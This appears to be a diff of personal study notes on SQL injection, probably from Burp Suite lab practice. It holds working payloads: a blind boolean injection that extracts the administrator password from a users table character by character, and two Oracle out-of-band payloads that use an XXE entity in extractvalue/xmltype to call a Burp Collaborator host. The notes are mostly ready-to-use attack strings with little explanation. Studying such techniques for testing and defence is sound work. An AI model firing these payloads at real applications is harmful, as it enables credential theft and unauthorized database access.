@@ -13,6 +13,11 @@ Once we have the length of the password we can bruteforce with a python script o
 For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
 `b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  
 
+### When a query is vulnerable to union injection, it may also be vulnerable to string concatenation EG:  
+`'union+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ih3je6mzb8119y9to6ajckyzjqpgd5.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`  
+
+`'||(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ih3je6mzb8119y9to6ajckyzjqpgd5.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--`  
+
 #### BlindSQL:
 Truth must be "infered" generally with a sleep function, a 500 response, or DNS callout to webhooks/collaborator
 
